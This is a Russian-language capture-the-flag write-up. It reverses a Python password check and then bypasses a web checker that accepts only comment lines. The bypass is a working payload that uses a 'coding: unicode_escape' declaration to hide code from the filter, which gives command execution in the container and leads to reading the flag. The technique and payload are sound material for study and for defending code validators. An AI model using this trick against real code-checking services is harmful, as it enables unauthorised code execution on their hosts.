## Описание

Дан скрипт `tearecipe_7a49aae.py` — Python-программа, которая расшифровывает одно из двух LFSR-зашифрованных сообщений в зависимости от аргумента командной строки. Одна из веток подсказывает про веб-проверщик «Mainframe», принимающий Python-файлы, но требующий, чтобы каждая строка начиналась с `#`. Нужно обойти этот фильтр, получить RCE в контейнере проверщика и прочитать флаг.

## Этап 1 — Реверс проверки пароля

Скрипт защищает второе сообщение проверкой:

```python
bytes([n + 1 for n in sys.argv[1].encode()]).upper() != b'IJSBLFHPNB'
```

Вычитая 1 из каждого байта `IJSBLFHPNB`, получаем `HIRAKEGOMA` — по-японски «Сезам, откройся».

Запуск `python3 tearecipe_7a49aae.py hirakegoma` расшифровывает `d2`:

> Mainframe is a very powerful computer, but can't brew tea ;(

Подсказка указывает на веб-проверщик «Mainframe» на странице задания.

## Этап 2 — Обход проверки «только комментарии»

Проверщик принимает Python-файлы, но требует, чтобы **каждая строка начиналась с `#`** (комментарий), и только потом исполняет файл. Нужен код, который выглядит как комментарии для построчного фильтра, но при этом исполняется как обычный Python.

Трюк: **объявление кодировки PEP 263 с `unicode_escape`**.

Python читает объявление `# coding:` из исходных байт файла и затем декодирует весь файл указанным кодеком перед парсингом. Кодек `unicode_escape` интерпретирует литеральные `\n` (6 ASCII-байт: обратный слеш + n) как настоящий перевод строки.

Файл до декодирования (проходит фильтр — всего 2 строки, обе начинаются с `#`):

```
# coding: unicode_escape
#\nimport os\nprint(os.popen("ls /").read())
```

После декодирования `unicode_escape` парсер Python видит:

```python
# coding: unicode_escape
#
import os
print(os.popen("ls /").read())
```

## Этап 3 — Поиск флага

С помощью `os.walk('/')` обходим файловую систему контейнера, находим и выводим флаг:

```
alfa{M4in_fr4MES_ARE_C0mp13X_bUt_cut3}
```
